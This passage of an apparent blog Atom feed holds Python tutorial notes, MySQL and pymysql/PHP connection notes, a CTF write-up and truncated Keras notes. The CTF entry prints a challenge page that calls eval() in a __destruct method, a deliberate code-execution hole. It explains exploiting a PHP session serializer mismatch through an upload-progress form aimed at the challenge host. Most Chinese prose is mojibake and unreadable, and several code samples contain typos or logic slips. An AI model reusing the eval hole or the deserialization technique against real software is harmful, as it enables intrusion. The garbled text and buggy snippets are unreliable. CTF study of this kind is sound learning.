class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a, L=[])</span>:</span></span><br><span class="line">    L.append(a)</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line">print(f(<span class="number">1</span>))</span><br><span class="line">print(f(<span class="number">2</span>))</span><br><span class="line">print(f(<span class="number">3</span>))</span><br></pre></td></tr></table></figure></p><p>&lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=def%20f%28a,%20L%3D%5B%5D%29%3A%0A%20%20%20%20L.append%28a%29%0A%20%20%20%20return%20L%0A%0Aprint%28f%281%29%29%0Aprint%28f%282%29%29%0Aprint%28f%283%29%29&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=15&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt;</p><p>ä¿®æ”¹æˆè¿™æ ·å°±è¡Œï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a, L = None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> L <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        L = []</span><br><span class="line">    L.append(a)</span><br><span class="line">    <span class="keyword">return</span> L</span><br></pre></td></tr></table></figure></p><h3>å¾ªç¯çš„tricks</h3><p>dictå¾ªç¯</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">knights = &#123;<span class="string">'gallahad'</span>:<span class="string">'the pure'</span>, <span class="string">'robin'</span>:<span class="string">'the brave'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> knights.items():</span><br><span class="line">    print(key, value)</span><br></pre></td></tr></table></figure></p><p>listå¾ªç¯</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate([<span class="string">'tac'</span>, <span class="string">'tic'</span>, <span class="string">'toe'</span>]):</span><br><span class="line">    print(<span class="string">"index = &#123;&#125;, value = &#123;&#125;"</span>.format(index, value))</span><br></pre></td></tr></table></figure></p><p>ä¸¤ä¸ªlistå¾ªç¯</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">questions = [<span class="string">'name'</span>, <span class="string">'quest'</span>, <span class="string">'favorite color'</span>]</span><br><span class="line">answers = [<span class="string">'lancelot'</span>, <span class="string">'the holy grail'</span>, <span class="string">'blue'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> q,a <span class="keyword">in</span> zip(questions, answers):</span><br><span class="line">    print(<span class="string">"what is your &#123;&#125;? It is &#123;&#125;"</span>.format(q, a))</span><br></pre></td></tr></table></figure></p><p>é€†å‘å¾ªç¯</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é€†å‘å¾ªç¯åºåˆ—æ—¶ï¼Œå…ˆæ­£å‘ï¼Œå†è°ƒç”¨reverse()å‡½æ•°</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(<span class="number">1</span>, <span class="number">10</span>, <span class="number">2</span>)):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure></p><p>æŒ‡å®šé¡ºåºå¾ªç¯ï¼Œç”¨<code>sorted</code>å‡½æ•°</p><h3>å‚æ•°çš„ä¼ é€’</h3><p>ä¹‹å‰è¿˜ä¸€ç›´æ²¡æ˜ç™½pythonä¸­<code>**param</code>è¿™ç§ä¼ é€’å½¢å¼çš„ç”¨æ³•è¿™ä¸ªæ —å­å°±å¾ˆæ£’å•¦</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cheeseshop</span><span class="params">(kind, *arguments, **keywords)</span>:</span></span><br><span class="line">    print(<span class="string">"-- Do you have any"</span>, kind, <span class="string">"?"</span>)</span><br><span class="line">    print(<span class="string">"-- I'm sorry, we're all out of"</span>, kind)</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> arguments:</span><br><span class="line">        print(arg)</span><br><span class="line">    print(<span class="string">"-"</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> kw <span class="keyword">in</span> keywords:</span><br><span class="line">        print(kw, <span class="string">":"</span>, keywords[kw])</span><br><span class="line">cheeseshop(<span class="string">"Limburger"</span>, <span class="string">"It's very runny, sir."</span>,</span><br><span class="line">           <span class="string">"It's really very, VERY runny, sir."</span>,shopkeeper=<span class="string">"Michael Palin"</span>,</span><br><span class="line">           client=<span class="string">"John Cleese"</span>,</span><br><span class="line">           sketch=<span class="string">"Cheese Shop Sketch"</span>)</span><br></pre></td></tr></table></figure></p><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- Do you have any Limburger ?</span><br><span class="line">-- I&apos;m sorry, we&apos;re all out of Limburger</span><br><span class="line">It&apos;s very runny, sir.</span><br><span class="line">It&apos;s really very, VERY runny, sir.</span><br><span class="line">----------------------------------------</span><br><span class="line">shopkeeper : Michael Palin</span><br><span class="line">sketch : Cheese Shop Sketch</span><br><span class="line">client : John Cleese</span><br></pre></td></tr></table></figure></p><p>ç¬¬ä¸€ä¸ªkindå‚æ•°å°±æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¹‹å<code>arguments</code>ç›¸å½“äºä¸€ä¸ªæ¥æ”¶äº†ä¸€ä¸ªlistï¼Œkeywordsæ¥æ”¶äº†ä¸€ä¸ªdict</p><h4>è§£åŒ…å‚æ•°åˆ—è¡¨</h4><p>æ¯”å¦‚è¿™ä¸ªæ —å­ï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">args = [<span class="number">3</span>,<span class="number">6</span>]</span><br><span class="line">list(range(*args))</span><br></pre></td></tr></table></figure></p><p>è¾“å‡ºçš„ç»“æœå°±æ˜¯[3,4,5]</p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>*</code>è¿ç®—ç¬¦æ¥å¯¹ä¸€ä¸ªlistè¿›è¡Œè§£åŒ…å¹¶å°†å…¶ä½œä¸ºå‚æ•°ä¼ é€’</p><h4>åŒ¿åå‡½æ•°lambda</h4><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pairs = [(<span class="number">1</span>, <span class="string">'one'</span>), (<span class="number">2</span>, <span class="string">'two'</span>), (<span class="number">3</span>, <span class="string">'three'</span>), (<span class="number">4</span>, <span class="string">'four'</span>)]</span><br><span class="line">pairs.sort(key=<span class="keyword">lambda</span>  pair:pair[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></p><p>sortæ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æŒ‡å®šå¾…æ’åºçš„å…³é”®å­—ï¼Œä¸€ä¸ªæ˜¯reversedï¼Œå…¶ä¸­keyç”¨ä¸€ä¸ªåŒ¿åå‡½æ•°è¿›è¡ŒæŒ‡å®šï¼Œæœ‰ä¸€ç‚¹å‡½æ•°å¼ç¼–ç¨‹çš„å‘³é“</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;python å®˜æ–¹æ–‡æ¡£é˜…è¯»&lt;/h1&gt;
&lt;p&gt;pythonå¯è§†åŒ–ç¼–ç¨‹&lt;a href=&quot;http://www.pythontutor.com/visualize.html#mode=edit&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ç½‘ç«™&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="python" scheme="https://prontosil.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>æ¢å¯»æ•°æ®åº“</title>
    <link href="https://prontosil.club/2019/07/22/%E6%8E%A2%E5%AF%BB%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>https://prontosil.club/2019/07/22/æ¢å¯»æ•°æ®åº“/</id>
    <published>2019-07-22T14:54:21.000Z</published>
    <updated>2019-07-22T14:55:29.848Z</updated>
    
    <content type="html"><![CDATA[<h1>mysqlå‘½ä»¤è¡Œæ“ä½œå°ç»“</h1><p>æ„Ÿè§‰è¿™äº›çŸ¥è¯†åˆå¿«å¿˜è®°äº†</p><ul><li>ç™»é™† <code>mysql -u root -p</code></li><li>åˆ›å»ºæ•°æ®åº“ <code>create database databasename</code></li><li>åˆ é™¤æ•°æ®åº“ <code>drop database databasename</code></li><li>ä»å¤–éƒ¨sqlæ–‡ä»¶å¯¼å…¥ï¼Œå¦‚æœsqlæ–‡ä»¶ä¸­æ²¡æœ‰åˆ›å»ºæ•°æ®åº“éœ€è¦å…ˆæŒ‡å®šä¸€ä¸ªæ•°æ®åº“ç„¶å<code>source path/*.sql</code>å°±å¯ä»¥å¯¼å…¥äº†ï¼Œå†ä¹Ÿä¸ç”¨å—çƒ¦äººçš„<code>phpmyadmin</code>å½±å“äº†</li><li>åˆ é™¤æ•°æ®è¡¨<code>drop table table_name</code></li><li>å¯¼å‡ºè¡¨<code>mysqldump -u root -p RUNOOB runoob_tbl &gt; dump.txt</code></li><li>å¯¼å‡ºæ•°æ®åº“<code>mysqldump -u root -p RUNOOB &gt; database_dump.txt</code></li><li>å¤‡ä»½æ‰€æœ‰æ•°æ®åº“<code>mysqldump -u root -p --all-databases &gt; database_dump.txt</code></li></ul><p>ä¸€èˆ¬<code>sql</code>æ–‡ä»¶çš„å†™æ³•ï¼š</p><p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> <span class="keyword">if</span> <span class="keyword">exists</span> DBName;</span><br><span class="line">creat database DBName;</span><br><span class="line"><span class="keyword">use</span> DBName;</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¼€å§‹åˆ›å»ºè¡¨</span></span><br><span class="line"><span class="keyword">create</span> ......</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¼€å§‹æ’å…¥æ•°æ®</span></span><br><span class="line">insert....</span><br></pre></td></tr></table></figure></p><h2>ä½¿ç”¨<code>pymysql</code>è¿æ¥æ•°æ®åº“</h2><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymsql</span><br><span class="line">con = pymysql.connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">''</span>, <span class="string">'mpsa'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> con.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        sql = <span class="string">'drop database runoob'</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line"></span><br><span class="line">    con.commit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    con.close()</span><br></pre></td></tr></table></figure></p><p>é‚£ä¸ª<code>cursor</code>å‡½æ•°æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ˜ç™½ä¸ºä»€ä¹ˆï¼Œä¸è¿‡ä¸€èˆ¬çš„ç”¨æ³•å°±æ˜¯è¿™æ ·å•¦</p><h2>phpè¿æ¥æ•°æ®åº“</h2><p>ä½¿ç”¨phpè¿æ¥æ•°æ®åº“,åˆ›å»ºæ•°æ®åº“ï¼Œç„¶ååˆ é™¤</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line"><span class="keyword">if</span>(!$conn)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"è¿æ¥æˆåŠŸ"</span>;</span><br><span class="line"><span class="comment">//æŸ¥è¯¢æ•°æ®</span></span><br><span class="line">$sql = <span class="string">"create database runoob"</span>;</span><br><span class="line">$retval = mysqli_query($conn, $sql);</span><br><span class="line"><span class="keyword">if</span>(!$retval)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"æŸ¥è¯¢æ•°æ®å¤±è´¥ï¼"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"åˆ›å»ºæˆåŠŸ"</span>;</span><br><span class="line">$sql1 = <span class="string">"drop database runoob"</span>;</span><br><span class="line">$retval = mysqli_query($conn, $sql);</span><br><span class="line">mysqli_close($conn);</span><br></pre></td></tr></table></figure></p><p>é‡åˆ°äº†é—®é¢˜ï¼š</p><p><img src="https://i.imgur.com/IcnNipt.png" alt="php6"></p><p>æŸ¥äº†ä¸€ä¸‹<code>stackoverflow</code>çœ‹åˆ°äº†è¿™ä¸ªå›ç­”ï¼š</p><blockquote><p>The mysqli-&gt;connect_error property only works properly as of PHP versions 5.2.9 and 5.3.0. Use the mysqli_connect_error() function if compatibility with earlier PHP versions is required.</p></blockquote><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'localhost'</span>, <span class="string">'my_user'</span>, <span class="string">'my_password'</span>, <span class="string">'my_db'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is the "official" OO way to do it,</span></span><br><span class="line"><span class="comment"> * BUT $connect_error was broken until PHP 5.2.9 and 5.3.0.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ($mysqli-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Connect Error ('</span> . $mysqli-&gt;connect_errno . <span class="string">') '</span></span><br><span class="line">            . $mysqli-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use this instead of $connect_error if you need to ensure</span></span><br><span class="line"><span class="comment"> * compatibility with PHP versions prior to 5.2.9 and 5.3.0.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_error()) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Connect Error ('</span> . mysqli_connect_errno() . <span class="string">') '</span></span><br><span class="line">            . mysqli_connect_error());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åŸæ¥æ˜¯å»ºç«‹è¿‡ç¨‹ä¸­çš„ä¸ç¨³å®šï¼Œæ€ªä¸å¾—æˆ‘æ–°å»ºçš„æ•°æ®åº“æ²¡æœ‰è¢«åˆ æ‰.</p><h1>å‚è€ƒ</h1><p><a href="https://stackoverflow.com/questions/18831863/property-access-is-not-allowed-yet-warning-when-using-prepared-statement" target="_blank" rel="noopener">stackoverflowçš„å›ç­”</a><a href="https://pymysql.readthedocs.io/en/latest/user/development.html" target="_blank" rel="noopener">pymysqlæ–‡æ¡£ï¼Œå†™çš„å¾ˆç®€å•</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;mysqlå‘½ä»¤è¡Œæ“ä½œå°ç»“&lt;/h1&gt;
&lt;p&gt;æ„Ÿè§‰è¿™äº›çŸ¥è¯†åˆå¿«å¿˜è®°äº†&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç™»é™† &lt;code&gt;mysql -u root -p&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;åˆ›å»ºæ•°æ®åº“ &lt;code&gt;create database databasename&lt;/code&gt;&lt;
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="sql" scheme="https://prontosil.club/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>php-challenge9</title>
    <link href="https://prontosil.club/2019/07/22/php-challenge9/"/>
    <id>https://prontosil.club/2019/07/22/php-challenge9/</id>
    <published>2019-07-22T14:50:01.000Z</published>
    <updated>2019-07-22T14:59:18.962Z</updated>
    
    <content type="html"><![CDATA[<h1>php-challenge 9</h1><p>ç¬¬ä¸€æ¬¡æ¥è§¦åˆ°è¿™ä¸ªé¢˜ç›®ï¼Œè¢«æƒŠå‘†äº†</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $mdzz;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">   $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>åˆçœ‹æºä»£ç è§‰å¾—å¹¶æ²¡æœ‰å“ªé‡Œå¯ä»¥è®©æˆ‘ååºåˆ—åŒ–æ³¨å…¥çš„åœ°æ–¹ä½†æ˜¯é—®é¢˜å°±å‡ºåœ¨ç¬¬ä¸€å¥è¯ï¼š<code>ini_set('session.serialize_handler', 'php');</code></p><blockquote><p>å…³é”®ç‚¹åœ¨äºï¼Œå¦‚æœè„šæœ¬ä¸­è®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸php.iniè®¾ç½®çš„ä¸åŒï¼Œæˆ–è€…ä¸¤ä¸ªè„šæœ¬æ³¨å†Œsessionä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸åŒï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚</p></blockquote><p>åªéœ€è¦åŠ ä¸€ä¸ª<code>|</code>å°±è¡Œ</p><p>è¿™é“<code>jarvisOj</code><a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">é¢˜ç›®</a>å°±æ˜¯è¿™ä¸ªåŸé¢˜è¿™é‡Œè¿˜ç”¨åˆ°äº†å¦å¤–ä¸€ä¸ªæ¼æ´ï¼š</p><p>è‡ªå·±æ„é€ ä¸€ä¸ªç½‘é¡µå¦‚ä¸‹ï¼š</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>ç„¶ååœ¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œæœ¬åœ°æŠ“åŒ…ï¼Œè¿™é‡Œé‡åˆ°äº†ä¸€ç‚¹å°é—®é¢˜ï¼Œå°±æ˜¯æ²¡åŠæ³•æŠ“åˆ°æœ¬åœ°çš„åŒ…ï¼Œå¯ä»¥é€šè¿‡ç›´æ¥å¯¹å±€åŸŸç½‘çš„ç½‘ç»œè¿æ¥è¿›è¡Œè®¾ç½®å³å¯.</p><p><img src="../assets/flag1_rw5qoyd8a.png" alt="flag1">æ­¤æ—¶å°±å¯ä»¥çœ‹åˆ°äº†</p><p>æ¥ä¸‹æ¥ç»§ç»­åˆ©ç”¨<img src="/assets/flag2_5a75jqie7.png" alt="flag2"></p><p>tqlã€‚ã€‚ã€‚<a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">æœ‰è¶£çš„phpååºåˆ—åŒ–æ€»ç»“</a><a href="https://blog.szfszf.top/tech/code-audit-challenge-%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1%e7%bb%83%e4%b9%a0%e7%ac%94%e8%ae%b0/#challenge9" target="_blank" rel="noopener">szfszf</a><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="noopener">jarvisoj-web-writeup</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;php-challenge 9&lt;/h1&gt;
&lt;p&gt;ç¬¬ä¸€æ¬¡æ¥è§¦åˆ°è¿™ä¸ªé¢˜ç›®ï¼Œè¢«æƒŠå‘†äº†&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/sp
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="ctf" scheme="https://prontosil.club/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>deep learning1</title>
    <link href="https://prontosil.club/2019/07/21/deep-learning1/"/>
    <id>https://prontosil.club/2019/07/21/deep-learning1/</id>
    <published>2019-07-21T08:07:58.000Z</published>
    <updated>2019-07-22T05:46:10.996Z</updated>
    
    <content type="html"><![CDATA[<h3>æ„ŸçŸ¥æœºè¡¥å……</h3><p>æ¥ç€å†™</p><p>æ„ŸçŸ¥æœºçš„è®­ç»ƒä¸­ï¼Œè€å¸ˆè¿˜æä¾›äº†ä¸€éƒ¨ä»½èµ„æ–™ï¼Œæ¯”å¦‚è®­ç»ƒå‡º$y=2x$</p><p>æˆ‘ä»¬ç®€è¦åœ°çœ‹ä¸€ä¸‹ä¸€æ¬¡è®­ç»ƒçš„ç»“æœï¼š</p><table><thead><tr><th>bias</th><th>x</th><th>y</th><th>w0</th><th>w1</th><th>yout</th><th>y-yout</th><th>adj0</th><th>adj1</th><th>alpha</th><th>w0new</th><th>w1new</th></tr></thead><tbody><tr><td>1</td><td>0.512</td><td>1.023</td><td>0.719</td><td>0.403</td><td>0.926</td><td>0.977</td><td>0.977</td><td>0.500</td><td>0.7</td><td>0.788</td><td>0.438</td></tr></tbody></table><p>è¿›è¡Œå¾ˆå¤šæ¬¡è®­ç»ƒä¹‹åç”»å‡ºçš„å›¾å½¢ï¼š<img src="https://i.loli.net/2019/07/10/5d2533696b1e993944.png" alt=""></p><p>é¢„æµ‹çš„è¿˜æ˜¯æŒºå‡†ç¡®çš„</p><h3>ä¸ºä»€ä¹ˆéœ€è¦biasï¼Ÿ</h3><p>æ¦‚å¿µä¸Šå¾ˆå¥½ç†è§£ï¼Œbiaså°±æ˜¯å°†ä¸€ä¸ªæ­£æ¯”ä¾‹å‡½æ•°å˜ä¸ºäº†ä¸€æ¬¡å‡½æ•°ï¼Œè¿™æ ·ä¸å¿…æ¯æ¬¡éƒ½è¿‡åŸç‚¹ï¼Œåˆ†ç±»çš„å‡†ç¡®æ€§ä¹Ÿå°±å¤§å¤§åœ°æé«˜äº†</p><h2>å¤šå±‚æ„ŸçŸ¥æœº</h2><p>ä¸€å±‚çš„æ„ŸçŸ¥æœºæ˜¯æ²¡åŠæ³•å¤„ç†å¼‚æˆ–é—®é¢˜çš„</p><p>æ‰€ä»¥éœ€è¦å¢åŠ éšè—å±‚å°±åƒä¸‹é¢è¿™æ ·ï¼š<img src="https://i.loli.net/2019/07/10/5d25354fec71179261.png" alt="">è¿™æ ·å°±å¯ä»¥åšåˆ°äº†ï¼š</p><p><img src="https://i.loli.net/2019/07/10/5d253567b050673436.png" alt=""></p><p>æ„Ÿè§‰MLPçš„æ•°å­¦çŸ¥è¯†å¤ªè¿‡å¤æ‚äº†ï¼Œæš‚æ—¶æ”¾ç€</p><h2>keras</h2><p>ä»æ —å­ä»£ç å¼€å§‹ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"></span><br><span class="line">model = Sequential()</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ä½¿ç”¨addæ¥å †å æ¨¡å‹</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">model.add(Dense(units=<span class="number">64</span>, activation=<span class="string">'relu'</span>, input_dim=<span class="number">100</span>))</span><br><span class="line">model.add(Dense(units=<span class="number">10</span>, activation=<span class="string">'softmax'</span>))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ä½¿ç”¨compileæ¥é…ç½®å­¦ä¹ è¿‡ç¨‹</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">model.compile(loss=<span 